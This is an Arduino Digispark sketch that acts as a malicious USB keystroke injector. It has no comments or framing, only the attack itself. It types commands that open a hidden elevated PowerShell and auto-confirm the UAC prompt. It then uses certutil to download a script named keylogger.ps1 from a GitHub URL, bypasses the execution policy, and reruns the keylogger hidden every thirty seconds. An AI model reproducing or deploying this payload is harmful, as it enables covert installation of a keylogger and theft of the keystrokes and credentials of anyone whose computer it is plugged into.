#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(" certutil -urlcache -split -f 'https://raw.githubusercontent.com/chithu162/final_project/master/keylogger.ps1'  $env:temp/script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-ExecutionPolicy Bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  while (true) {
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -File $env:temp/script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(30000);
  }
}
